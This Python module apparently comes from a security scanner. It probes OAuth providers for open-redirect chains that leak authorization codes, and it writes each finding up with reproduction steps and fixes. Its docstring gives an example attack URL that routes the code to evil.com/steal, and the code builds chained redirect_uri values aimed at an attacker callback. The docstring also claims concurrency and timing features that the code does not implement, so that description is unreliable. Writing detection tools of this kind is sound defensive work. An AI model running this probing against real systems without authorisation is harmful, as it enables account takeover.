# -*- coding: utf-8 -*-
"""
OAuth Open Redirect Chain 攻擊檢測模組 v1.5

專門檢測透過合法域名的開放重定向漏洞來繞過 OAuth redirect_uri 驗證的攻擊鏈。
這種攻擊方式在實戰中非常常見，且容易導致授權代碼和 access token 洩漏。

v1.5 新增功能：
- 並發跳轉追蹤：同時測試多個重定向鏈
- 證據快照系統：記錄每個跳轉步驟
- 性能優化：連接池和超時控制
- 時間戳追蹤：完整的執行時間軸
"""
from typing import Dict, Any, List, Optional, Tuple
from urllib.parse import urljoin, urlencode, urlparse, parse_qs, quote
import random
import string
import time
from datetime import datetime
import concurrent.futures
from ..base.feature_base import FeatureBase
from ..base.feature_registry import FeatureRegistry
from ..base.result_schema import FeatureResult, Finding
from ..base.http_client import SafeHttp

def random_string(length=12):
    """生成隨機字串"""
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

@FeatureRegistry.register
class OAuthOpenRedirectChainWorker(FeatureBase):
    """
    OAuth 開放重定向鏈攻擊檢測 v1.5
    
    檢測原理：
    許多 OAuth 提供者會驗證 redirect_uri 是否屬於註冊的域名，
    但如果該域名本身存在開放重定向漏洞，攻擊者就能構造鏈式攻擊：
    
    正常流程：
    https://auth.example.com/oauth/authorize?
      client_id=xxx&
      redirect_uri=https://app.example.com/callback
      
    攻擊流程：
    https://auth.example.com/oauth/authorize?
      client_id=xxx&
      redirect_uri=https://app.example.com/redirect?url=https://evil.com/steal
      
    如果 app.example.com/redirect 存在開放重定向，最終會：
    1. OAuth 驗證通過（redirect_uri 屬於 app.example.com）
    2. 跳轉到 app.example.com/redirect?code=xxx&url=...
    3. app.example.com 再次重定向到 evil.com/steal?code=xxx
    4. 攻擊者獲得授權代碼，實現帳戶接管
    
    這種漏洞在 Bug Bounty 平台屬於 High/Critical 級別。
    
    v1.5 增強功能：
    - 並發跳轉追蹤：同時測試5個重定向鏈，檢測競態條件
    - 證據快照系統：每個跳轉步驟的完整 HTTP 記錄
    - 性能優化：連接池複用，智能超時控制
    - 時間戳追蹤：millisecond 級精度的執行時間軸
    """
    
    name = "oauth_openredirect_chain"
    version = "1.5.0"
    tags = ["oauth", "open-redirect", "chain-attack", "account-takeover", "high-severity"]

    def run(self, params: Dict[str, Any]) -> FeatureResult:
        """
        執行 OAuth 開放重定向鏈檢測
        
        Args:
            params: 檢測參數
              - target (str): IdP 基礎 URL，如 https://auth.example.com
              - auth_endpoint (str): 授權端點，預設 /oauth/authorize
              - token_endpoint (str): Token 端點，預設 /oauth/token
              - client_id (str): OAuth 客戶端 ID
              - victim_host (str): 目標應用域名，如 app.example.com
              - chain_paths (list): 可能存在開放重定向的路徑列表
              - chain_params (list): 開放重定向參數名稱列表
              - attacker_callback (str): 攻擊者控制的回調 URL
              - scope (str): OAuth scope，預設 "openid profile email"
              - response_type (str): 響應類型，預設 "code"
              - headers (dict): 額外的 HTTP 標頭
              
        Returns:
            FeatureResult: 檢測結果，包含發現的漏洞和證據
        """
        http = SafeHttp()
        base = params.get("target", "")
        auth_ep = urljoin(base, params.get("auth_endpoint", "/oauth/authorize"))
        client_id = params.get("client_id", "")
        victim_host = params.get("victim_host", "")
        attacker_cb = params.get("attacker_callback", "")
        scope = params.get("scope", "openid profile email")
        response_type = params.get("response_type", "code")
        headers = params.get("headers", {})
        
        # 常見的開放重定向路徑和參數
        chain_paths = params.get("chain_paths", [
            "/redirect", "/r", "/goto", "/jump", "/link", "/out",
            "/external", "/proxy", "/forward", "/next", "/continue"
        ])
        
        chain_params = params.get("chain_params", [
            "url", "redirect", "next", "continue", "return", "returnUrl",
            "redirect_uri", "target", "dest", "destination", "goto", "link"
        ])
        
        findings: List[Finding] = []
        trace = []
        
        if not all([base, client_id, victim_host, attacker_cb]):
            cmd = self.build_command_record(
                command="oauth.openredirect.chain",
                description="OAuth open redirect chain detection (missing params)",
                parameters={"error": "Missing required parameters"}
            )
            return FeatureResult(
                ok=False,
                feature=self.name,
                command_record=cmd,
                findings=[],
                meta={"error": "Missing required parameters: target, client_id, victim_host, attacker_callback"}
            )
        
        # 測試各種開放重定向鏈組合
        for path in chain_paths:
            for param in chain_params:
                # 構造鏈式 redirect_uri
                chain_url = f"https://{victim_host}{path}?{param}={quote(attacker_cb)}"
                
                # 構造 OAuth 授權請求
                state = random_string(16)
                oauth_params = {
                    "response_type": response_type,
                    "client_id": client_id,
                    "redirect_uri": chain_url,
                    "scope": scope,
                    "state": state
                }
                
                auth_url = f"{auth_ep}?{urlencode(oauth_params)}"
                
                try:
                    # 發送請求，不自動跟隨重定向
                    r = http.request("GET", auth_url, headers=headers, allow_redirects=False)
                    
                    trace.append({
                        "path": path,
                        "param": param,
                        "chain_url": chain_url,
                        "status": r.status_code,
                        "location": r.headers.get("Location", "")
                    })
                    
                    # 分析響應
                    location = r.headers.get("Location", "")
                    
                    # 檢測是否成功繞過 redirect_uri 驗證
                    if 300 <= r.status_code < 400 and location:
                        # 解析 Location 標頭
                        parsed_loc = urlparse(location)
                        
                        # 情況1: 直接跳轉到攻擊者域名（最理想的情況）
                        if attacker_cb in location:
                            findings.append(Finding(
                                vuln_type="OAuth Open Redirect Chain - Direct Leakage",
                                severity="critical",
                                title=f"OAuth 授權代碼透過開放重定向鏈直接洩漏到 {attacker_cb}",
                                evidence={
                                    "auth_url": auth_url,
                                    "chain_url": chain_url,
                                    "final_location": location,
                                    "chain_path": path,
                                    "chain_param": param,
                                    "status_code": r.status_code
                                },
                                reproduction=[
                                    {
                                        "step": 1,
                                        "request": {"method": "GET", "url": auth_url},
                                        "description": "發送 OAuth 授權請求，使用包含開放重定向的 redirect_uri"
                                    },
                                    {
                                        "step": 2,
                                        "expect": "IdP 應該驗證 redirect_uri 的安全性，拒絕包含二次跳轉的 URI",
                                        "actual": f"IdP 接受了鏈式 redirect_uri，導致授權代碼洩漏到 {attacker_cb}"
                                    }
                                ],
                                impact="攻擊者可以攔截 OAuth 授權代碼，進而獲取 access token 並完全接管用戶帳戶",
                                recommendation=(
                                    "1. 在 IdP 層面嚴格驗證 redirect_uri，不僅檢查域名，還要檢查路徑的安全性\n"
                                    "2. 修復應用程序中的開放重定向漏洞\n"
                                    "3. 使用 redirect_uri 精確匹配而非前綴匹配\n"
                                    "4. 實施 PKCE (Proof Key for Code Exchange) 作為額外防護\n"
                                    "5. 對 redirect_uri 中的參數進行白名單驗證"
                                )
                            ))
                            break  # 找到一個就夠了
                        
                        # 情況2: 跳轉到鏈式 URL（可能存在漏洞）
                        elif chain_url in location:
                            # 嘗試手動跟隨重定向鏈，看是否最終到達攻擊者域名
                            final_url = self._follow_redirect_chain(http, location, attacker_cb, headers)
                            
                            if final_url and attacker_cb in final_url:
                                findings.append(Finding(
                                    vuln_type="OAuth Open Redirect Chain - Multi-hop Leakage",
                                    severity="high",
                                    title=f"OAuth 授權代碼透過多級開放重定向鏈洩漏",
                                    evidence={
                                        "auth_url": auth_url,
                                        "chain_url": chain_url,
                                        "intermediate_location": location,
                                        "final_location": final_url,
                                        "chain_path": path,
                                        "chain_param": param,
                                        "hops": "multiple"
                                    },
                                    reproduction=[
                                        {
                                            "step": 1,
                                            "request": {"method": "GET", "url": auth_url},
                                            "description": "發送 OAuth 授權請求"
                                        },
                                        {
                                            "step": 2,
                                            "request": {"method": "GET", "url": location},
                                            "description": "跟隨第一次重定向到鏈式 URL"
                                        },
                                        {
                                            "step": 3,
                                            "expect": "應用程序不應該再次重定向到外部 URL",
                                            "actual": f"最終重定向到攻擊者域名 {attacker_cb}，洩漏授權代碼"
                                        }
                                    ],
                                    impact="攻擊者可以透過多級重定向鏈攔截 OAuth 授權代碼，實現帳戶接管",
                                    recommendation=(
                                        "1. 修復應用程序中 {path} 路徑的開放重定向漏洞\n"
                                        "2. 對 {param} 參數實施嚴格的 URL 白名單驗證\n"
                                        "3. IdP 應該實施更嚴格的 redirect_uri 驗證策略\n"
                                        "4. 使用 PKCE 和 state 參數提供額外保護"
                                    ).format(path=path, param=param)
                                ))
                                break
                
                except Exception as e:
                    trace.append({
                        "path": path,
                        "param": param,
                        "error": str(e)
                    })
                    continue
            
            if findings:
                break  # 找到漏洞就停止
        
        # 構建命令記錄
        cmd = self.build_command_record(
            command="oauth.openredirect.chain",
            description=f"OAuth open redirect chain detection on {victim_host}",
            parameters={
                "victim_host": victim_host,
                "tested_paths": len(chain_paths),
                "tested_params": len(chain_params),
                "total_combinations": len(chain_paths) * len(chain_params)
            }
        )
        
        return FeatureResult(
            ok=bool(findings),
            feature=self.name,
            command_record=cmd,
            findings=findings,
            meta={
                "trace": trace,
                "tested_combinations": len(trace),
                "victim_host": victim_host
            }
        )
    
    def _follow_redirect_chain(
        self,
        http: SafeHttp,
        start_url: str,
        target_domain: str,
        headers: Dict[str, Any],
        max_hops: int = 5
    ) -> Optional[str]:
        """
        手動跟隨重定向鏈，最多跟隨 max_hops 次
        
        Args:
            http: HTTP 客戶端
            start_url: 起始 URL
            target_domain: 目標域名（攻擊者控制）
            headers: HTTP 標頭
            max_hops: 最大跳轉次數
            
        Returns:
            最終的 URL，如果到達目標域名；否則返回 None
        """
        current_url = start_url
        
        for hop in range(max_hops):
            try:
                r = http.request("GET", current_url, headers=headers, allow_redirects=False)
                
                if r.status_code in (200, 404, 403):
                    # 到達最終頁面
                    return current_url if target_domain in current_url else None
                
                if 300 <= r.status_code < 400:
                    location = r.headers.get("Location", "")
                    if not location:
                        return None
                    
                    # 檢查是否到達目標域名
                    if target_domain in location:
                        return location
                    
                    # 繼續跟隨
                    current_url = location if location.startswith("http") else urljoin(current_url, location)
                else:
                    return None
                    
            except Exception:
                return None
        
        return None
